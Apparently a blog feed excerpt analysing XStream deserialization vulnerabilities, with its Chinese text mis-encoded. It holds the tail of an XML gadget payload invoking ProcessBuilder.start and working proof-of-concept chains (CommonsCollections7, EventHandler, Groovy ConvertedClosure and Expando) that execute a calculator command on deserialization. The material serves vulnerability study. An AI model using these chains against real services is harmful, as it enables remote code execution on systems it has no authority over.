&amp;lt;filter class&amp;#x3D;&amp;quot;javax.imageio.ImageIO$ContainsFilter&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;class&amp;gt;java.lang.ProcessBuilder&amp;lt;&amp;#x2F;class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;name&amp;gt;start&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;parameter-types&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;&amp;#x2F;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;name&amp;gt;foo&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;next class&amp;#x3D;&amp;quot;string&amp;quot;&amp;gt;foo&amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;&amp;#x2F;serviceIterator&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;lock&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;&amp;#x2F;cipher&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;input class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder$NullInputStream&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ibuffer&amp;gt;&amp;lt;&amp;#x2F;ibuffer&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;done&amp;gt;false&amp;lt;&amp;#x2F;done&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ostart&amp;gt;0&amp;lt;&amp;#x2F;ostart&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ofinish&amp;gt;0&amp;lt;&amp;#x2F;ofinish&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;closed&amp;gt;false&amp;lt;&amp;#x2F;closed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;&amp;#x2F;is&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;consumed&amp;gt;false&amp;lt;&amp;#x2F;consumed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;&amp;#x2F;dataSource&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;transferFlavors&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;&amp;#x2F;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataLen&amp;gt;0&amp;lt;&amp;#x2F;dataLen&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;&amp;#x2F;value&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&amp;#x2F;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–è¯¦è§£ï¼ˆä¸€ï¼‰</title>
    <link href="http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-05-08T09:17:00.000Z</published>
    <updated>2022-03-21T06:02:00.586Z</updated>
    
    <content type="html"><![CDATA[<p>XStream ååºåˆ—åŒ–é—®é¢˜ç”±æ¥å·²ä¹…ï¼Œä»&lt;=1.4.6ç‰ˆæœ¬ä¹‹ä¸‹çš„EventHandleråˆ©ç”¨æ–¹å¼ï¼Œåˆ°20å¹´çš„CVE-2020-26217ï¼Œå†åˆ°21å¹´é’Ÿå¸ˆå‚…ã€threedr3amã€whit3p1gå¸ˆå‚…ä»¬ä¸è¦é’±ä¼¼çš„6ä¸ªCVEã€‚å®ƒçš„æˆå› ä¸åŒäºfastjsonä¹‹ç±»ï¼Œä¹Ÿæœ‰å¼‚äºåŸç”ŸJavaååºåˆ—åŒ–ï¼Œå¾ˆæœ‰ç‰¹ç‚¹ï¼Œå€¼å¾—å­¦ä¹ ã€‚</p><p>æœ¬èŠ‚å…¶å®ç®—æ˜¯Wh1t3p1gå¸ˆå‚…ã€Šå›é¡¾XStreamååºåˆ—åŒ–æ¼æ´ã€‹çš„å­¦ä¹ ç¬”è®°ï¼Œä¹Ÿè¯•ç€è§£é‡Šå¸ˆå‚…æ²¡æåˆ°çš„ä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚</p><h2 id="1-XStream-åŸç†è§£æ"><a href="#1-XStream-åŸç†è§£æ" class="headerlink" title="1. XStream åŸç†è§£æ"></a>1. XStream åŸç†è§£æ</h2><h3 id="1-1-æºç è§£æ"><a href="#1-1-æºç è§£æ" class="headerlink" title="1.1 æºç è§£æ"></a>1.1 æºç è§£æ</h3><p>å‚è€ƒã€3ã€‘<br><img src="/images/pasted-136.png" alt="upload successful"></p><a id="more"></a><h4 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h4><p>Mapperçš„ä½œç”¨ç±»ä¼¼aliasï¼Œå³å°†å®é™…çš„classä¸xmlå…ƒç´ åç§°å¯¹åº”èµ·æ¥ã€‚ä¾‹å¦‚</p><ul><li>sorted-setå¯¹åº”java.util.SortedSet</li></ul><h5 id="XStream-mapper"><a href="#XStream-mapper" class="headerlink" title="XStream.mapper"></a>XStream.mapper</h5><p>æ˜¯åœ¨<code>XStream.buildMapper()</code>ä¸­è¿›è¡Œåˆå§‹åŒ–</p><p>é€šè¿‡<code>Class type = HierarchicalStreams.readClassType(reader, mapper)</code>è¿›è¡Œè°ƒç”¨ã€‚</p><h4 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h4><p>Converterå­—é¢æ„ä¹‰ä¸ºè½¬æ¢å™¨ï¼Œè´Ÿè´£å¯¹æ¯ä¸ªJava Objectè¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚æœ‰<code>IntConverter</code>ã€<code>CharConverter</code>ã€<code>TreeSetConverter</code>ç­‰ç­‰</p><h5 id="xstream-converterLookup"><a href="#xstream-converterLookup" class="headerlink" title="xstream.converterLookup"></a>xstream.converterLookup</h5><p>åœ¨<code>XStream.setupConverters()</code>ä¸­è¿›è¡Œåˆå§‹åŒ–</p><p>é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œè°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># è·å–type ç±»å‹ï¼Œtypeä¸ºclassï¼Œeg java.util.SortdSet</span><br><span class="line">Converter converter = converterLookup.lookupConverterForType(type);</span><br><span class="line"># converter å€¼ä¸ºTreeSetConverter</span><br><span class="line">convert(parent, type, converter);</span><br></pre></td></tr></table></figure><h3 id="1-2-SerializableConverter"><a href="#1-2-SerializableConverter" class="headerlink" title="1.2 SerializableConverter"></a>1.2 SerializableConverter</h3><p>ç®€å•æ¥è®²ï¼Œå¦‚æœclass å®ç°äº†Serializableï¼Œé‚£ä¹ˆå¯¹åº”çš„Converterä¸ºSerializableConverterï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆå°±æ˜¯å…¶ä»–çš„Converterï¼Œä¾å‰æ–‡<code>lookupConverterForType(type)</code>ä¸­çš„typeè€Œå®šã€‚</p><p>å‚è€ƒã€2ã€‘ä¸­æœ‰ç€ä¸€éƒ¨åˆ†çš„ä»£ç åŠè°ƒè¯•ï¼Œä¸èµ˜è¿°</p><h3 id="1-3-CustomObjectInputStream"><a href="#1-3-CustomObjectInputStream" class="headerlink" title="1.3 CustomObjectInputStream"></a>1.3 CustomObjectInputStream</h3><p>éƒ½çŸ¥é“ååºåˆ—åŒ–æ˜¯é€šè¿‡ <code>ObjectInputStream.readObject()</code>å®ç°Inputè½¬Objectçš„ã€‚é’ˆå¯¹å®ç°äº†Serializableæ¥å£çš„ç±»ï¼ŒXStreamä¹Ÿæ˜¯é€šè¿‡è°ƒç”¨readObjectè¿›è¡Œè½¬åŒ–çš„ï¼Œä½†æ˜¯Inputæ˜¯xmlæ ¼å¼çš„ï¼Œå¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿ</p><p><code>ObjectInputStream.readObject()</code>çš„å®ç°æµç¨‹å¦‚ä¸‹ï¼š<br><img src="/images/pasted-135.png" alt="upload successful"></p><p>å¯ä»¥çœ‹åˆ°Inputä¼šè¢«è§£ææˆä¸€ä¸ªä¸ªç±»ä¼¼TC_OBJECTçš„æ•°æ®ç»“æ„ï¼ŒXstream å¤§è‡´æ¥è¯´æ˜¯é€šè¿‡CustomObjectInputStreamå®ç°è¿™ç§è§£æxmlç»“æ„çš„ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯CustomObjectInputStream.StreamCallback æ¥å£ï¼Œåœ¨ExternalizableConverterå’ŒSerializableConverter æœ‰ä¸åŒçš„å®ç°ï¼Œä»¥SerializableConverterä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CustomObjectInputStream.StreamCallback callback = <span class="keyword">new</span> CustomObjectInputStream.StreamCallback() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readFromStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      reader.moveDown();</span><br><span class="line">      Class type = HierarchicalStreams.readClassType(reader, SerializableConverter.<span class="keyword">this</span>.mapper);</span><br><span class="line">      Object value = context.convertAnother(result, type);</span><br><span class="line">      reader.moveUp();</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-ååºåˆ—åŒ–åˆ©ç”¨"><a href="#2-ååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="2. ååºåˆ—åŒ–åˆ©ç”¨"></a>2. ååºåˆ—åŒ–åˆ©ç”¨</h2><p>å¼•ç”¨Wh1t3p1gå¸ˆå‚…çš„è§£é‡Š</p><blockquote><p>XStreamååºåˆ—åŒ–åŒfastjsonè¿™ç§ä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯fastjsonä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸»åŠ¨å»è°ƒç”¨getterså’Œsettersï¼Œè€ŒXStreamçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­èµ‹å€¼éƒ½ç”±Javaçš„åå°„æœºåˆ¶æ¥å®Œæˆï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰è¿™æ ·ä¸»åŠ¨è°ƒç”¨çš„ç‰¹æ€§ã€‚</p></blockquote><blockquote><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œå›æƒ³ä¸€ä¸‹ï¼Œåœ¨å‡ æ¡å¸¸è§„çš„javaååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸Šï¼Œéƒ½åˆ©ç”¨äº†HashMapã€PriorityQueueç­‰å¯¹è±¡ï¼ˆkeyä¸å¯é‡å¤ç­‰ç‰¹æ€§ï¼‰ä¼šè‡ªåŠ¨å»è°ƒç”¨hashCodeã€equalã€compareToç­‰è¿™ç§å‡½æ•°ã€‚</p></blockquote><p>è®²çš„å¾ˆæ˜ç™½äº†ï¼Œå¼ºè°ƒä¸€ç‚¹ï¼š<strong>javaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œç±»å¿…é¡»è¦å¯Serializableï¼Œä½†æ˜¯åœ¨Xstreamä¸Šï¼Œå¹¶ä¸æ˜¯å¿…é¡»</strong>ï¼Œè¿™é‡Œæ˜¯ä¸€åˆ‡åˆ©ç”¨é“¾çš„æ ¹æœ¬åŸå› ã€‚</p><ol><li>åŸJavaååºåˆ—åŒ–é“¾å½“ç„¶å¯ä»¥ç”¨</li><li>å¯»æ‰¾æ–°çš„HashMapã€PriorityQueue</li></ol><h3 id="2-1-åŸJavaååºåˆ—åŒ–é“¾"><a href="#2-1-åŸJavaååºåˆ—åŒ–é“¾" class="headerlink" title="2.1 åŸJavaååºåˆ—åŒ–é“¾"></a>2.1 åŸJavaååºåˆ—åŒ–é“¾</h3><p>è¿™é‡Œè´´ä¸€ä¸‹åŸºäºcc7çš„poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        Object calc = <span class="keyword">new</span> CommonsCollections7().getObject(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        String xml = xStream.toXML(calc);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        Object cc7 = xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰"><a href="#2-2-å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰" class="headerlink" title="2.2 å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰"></a>2.2 å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰</h3><p>Wh1t3p1gå¸ˆå‚…æ–‡ç« ä¸­è§£é‡Šäº†è¿™ä¸‰ä¸ªç‰¹æ®Šçš„ç±»</p><ol><li>MapConverterï¼Œä¼šè°ƒç”¨hashCode</li><li>TreeSet/TreeMapConverterï¼Œä¼šè°ƒç”¨compareTo</li><li>DynamicProxyConverterï¼Œåˆ›å»ºäº†Proxy instanceï¼ŒInvocationHandlerå¯æ§</li></ol><p>å¸ˆå‚…å·²ç»è®²çš„å¾ˆæ˜ç™½äº†ï¼Œè¿™é‡Œä¹Ÿä¸å¤šè®²ï¼Œç®€å•è§£é‡Š</p><h4 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><h5 id="1-EventHandler"><a href="#1-EventHandler" class="headerlink" title="1. EventHandler"></a>1. EventHandler</h5><p>è¿™é‡Œæ¶‰åŠåˆ°javaåŠ¨æ€ä»£ç†çŸ¥è¯†ï¼Œç”¨åˆ°çš„æ˜¯TreeSetConverter+DynamicProxyConverterï¼ŒpocåŸæ–‡æœ‰ï¼Œå°±ä¸è´´äº†ï¼Œç®€å•è§£é‡Šä¸‹é€»è¾‘å¦‚ä¸‹:</p><ul><li><p>TreeSetConverter å½“æ–°æ’å…¥ä¸€ä¸ªkeyï¼Œä¼šè¿è¡Œkeyçš„compareToæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure></li><li><p>DynamicProxyConverter å®ç°ç”Ÿæˆä»£ç†ç±»å®ä¾‹ï¼Œé‡ç‚¹æ˜¯å…¶ä¸­çš„handlerå¯æ§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy = Proxy.newProxyInstance(classLoaderReference.getReference(), interfacesAsArray, handler);</span><br></pre></td></tr></table></figure></li><li><p>EventHandler å°±æ˜¯è¿™æ ·ç†æƒ³çš„å¯æ§InvocationHandlerã€‚EventHandler æœ‰å±æ€§target&amp;actionï¼Œå…¶ä¸­targetä¸ºobjectï¼Œactionä¸ºmethodï¼ŒEventHandler çš„invokeå®ç°ä¸Šçš„é€»è¾‘æœ€ç»ˆä¼šæ‰§è¡Œaction.invoke(target,args)ï¼Œå…¶ä¸­target Demoä¸ºProcessBuilderå¯¹è±¡ï¼Œactionä¸ºstartæ–¹æ³•ï¼Œæœ€ç»ˆå®ç°RCEã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ä¼ªä»£ç </span><br><span class="line"># proxy.compareTo()</span><br><span class="line"># EventHandler è¢«ä»£ç†ç±»ä¼šæ‰§è¡Œ invoke(proxy,&quot;compareTo&quot;,arguments)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> </span></span><br></pre></td></tr></table></figure></li></ul><p>å…¶å®ç†è§£äº†è¿™ä¸ªçš„é€»è¾‘ï¼Œä¸‹é¢çš„å‡ ä¸ªéƒ½æ¯”è¾ƒç±»ä¼¼äº†</p><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªåˆ©ç”¨é“¾çš„é‡ç‚¹æ˜¯EventHandler</p><h5 id="2-Groovy-ConvertedClosure"><a href="#2-Groovy-ConvertedClosure" class="headerlink" title="2. Groovy ConvertedClosure"></a>2. Groovy ConvertedClosure</h5><p>Groovy ConvertedClosure è¿™ä¸ªé“¾å…¶å®å’Œysoserial çš„Groovy1é“¾ç±»ä¼¼ï¼Œåªä¸è¿‡Handleræœ‰ç‚¹ä¸ä¸€æ ·ã€‚è¯¦ç»†åˆ†æå¯ä»¥çœ‹çœ‹Groovyé“¾çš„åˆ†æï¼Œå¸ˆå‚…æ–‡ç« é‡Œæœ‰é“¾æ¥ï¼Œblogé‡Œé¢ä¹Ÿæœ‰è¿™ä¸ªé“¾çš„ç®€å•åˆ†æã€‚</p><h6 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h6><p>Wh1t3p1gå¸ˆå‚…æåˆ°çš„æ˜¯è¿™ä¸ªå§¿åŠ¿å®ç°RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">mc.call(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œè¿™æ ·ä¹Ÿå¯ä»¥è§¦å‘ï¼ˆä½†æ˜¯ä¸å¸¦å‚æ•°ï¼Œæš‚æ—¶æ²¡æ‰¾åˆ°å¯ä»¥æ— å‚æ•°çš„åç»­åˆ©ç”¨é“¾ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">mc.call()</span><br></pre></td></tr></table></figure><p>Groovy1é“¾ç”¨çš„å°±æ˜¯è¿™ç§ï¼Œæ°å¥½æ˜¯æ— å‚æ•°çš„è§¦å‘ã€‚</p><h6 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">    ConvertedClosure handler = <span class="keyword">new</span> ConvertedClosure((Closure) mc, <span class="string">&quot;compareTo&quot;</span>);</span><br><span class="line">    Object map = Proxy.newProxyInstance(</span><br><span class="line">            GroovyConvertedClosure.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Comparable.class&#125;, handler);</span><br><span class="line">    TreeSet ts = PayloadHelper.makeTreeSet(<span class="string">&quot;open -a calculator.app&quot;</span>, map);</span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(ts);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    </span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-Groovy-Expando"><a href="#3-Groovy-Expando" class="headerlink" title="3. Groovy Expando"></a>3. Groovy Expando</h5><blockquote><p>å‰é¢ç”¨åˆ°äº†TreeSetçš„æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬å»ä½¿ç”¨Mapçš„ç±»å‹æ¥è§¦å‘ã€‚ä»¥Mapçš„ç±»å‹æ¥è§¦å‘ï¼Œé‚£å°±æ˜¯æ‰¾å¯ä»¥åˆ©ç”¨çš„hashCodeå‡½æ•°</p></blockquote><blockquote><p>groovy.util.Expando#hashCode</p></blockquote><p>å¸ˆå‚…çš„æ€è·¯æ˜¯ä»å¯»æ‰¾hashCodeï¼Œå¾€ä¸Šå›æº¯</p><ol><li>groovy.util.Expando#hashCode æ‰§è¡Œäº†closure.call()ï¼Œå…¶ä¸­closureæ¥æºä¸ºå±æ€§expandoProperties</li><li>TreemapConverter æ¯æ¬¡æ’å…¥objçš„æ—¶å€™ï¼Œéƒ½ä¼šæ‰§è¡Œobj.hashCode</li></ol><p>æ€è·¯å¾ˆç®€å•ï¼Œpocå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando1</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">    Expando exp = <span class="keyword">new</span> Expando();</span><br><span class="line">    exp.setProperty(<span class="string">&quot;hashCode&quot;</span>,mc);</span><br><span class="line"></span><br><span class="line">    HashMap tp = PayloadHelper.makeMap(<span class="string">&quot;foo&quot;</span>,exp);</span><br><span class="line"></span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(tp);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç”¨åˆ°çš„æ˜¯MapConveterã€‚</p><h5 id="4-ImageIO-ContainsFilter"><a href="#4-ImageIO-ContainsFilter" class="headerlink" title="4. ImageIO$ContainsFilter"></a>4. ImageIO$ContainsFilter</h5><p>è¿™ä¸ªé“¾æ¯”è¾ƒé•¿ï¼Œæ€è·¯æ¥æºæ˜¯marshalsecçš„ImageIO gadgetï¼Œé€†å‘å‘ç°çš„ç¡®å¾ˆéš¾ï¼ŒWh1t3p1gå¸ˆå‚…ä¹Ÿæ˜¯ä»æ­£å‘å»è·Ÿè¸ªçš„ã€‚</p><p>æ­£å‘çš„å¤ç°å¸ˆå‚…æ–‡ç« é‡Œä¹Ÿå¾ˆè¯¦ç»†äº†ï¼Œä¸èµ˜è¿°äº†ã€‚</p><h5 id="5-ServiceFinder-LazyIterator"><a href="#5-ServiceFinder-LazyIterator" class="headerlink" title="5. ServiceFinder$LazyIterator"></a>5. ServiceFinder$LazyIterator</h5><p>è¿™ä¸ªé“¾çš„æ€è·¯æœ€æ—©ã€4ã€‘ä¸­orich1å¸ˆå‚…çš„å‘ç°ï¼Œè¿‡ç¨‹ä¹Ÿæ¯”è¾ƒé•¿ï¼Œé‡ç‚¹æ˜¯ä»BCELè§¦å‘ï¼Œå¯»æ‰¾å¯ç”¨çš„lass.ForName()åˆ©ç”¨ç‚¹ï¼ŒIterator.nextè¿™é‡Œå¼€å§‹é€†å‘å‘ç°æ–°çš„é“¾ã€‚Wh1t3p1gå¸ˆå‚…çš„å®ç°BCELä¹Ÿå¾ˆæœ‰äº®ç‚¹ï¼Œå¾ˆå€¼å¾—å­¦ä¹ ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚ç®€è¦ä»‹ç»äº†XStreamçš„åºåˆ—åŒ–&amp;ååºåˆ—åŒ–çš„å®ç°åŸç†ã€‚javaååºåˆ—åŒ–ï¼Œç±»å¿…é¡»è¦å¯Serializableï¼Œä½†æ˜¯åœ¨XStreamä¸Šï¼Œå¹¶ä¸æ˜¯å¿…é¡»ã€‚é’ˆå¯¹éSeriablzableçš„ç±»ï¼ŒXStreamå¼•å…¥äº†å¤šç§Conveterå®ç°è¿™ä¸€è¿‡ç¨‹ã€‚</p><p>å…¶ä¸­EventHandler å’ŒGroovy ConvertedClosure 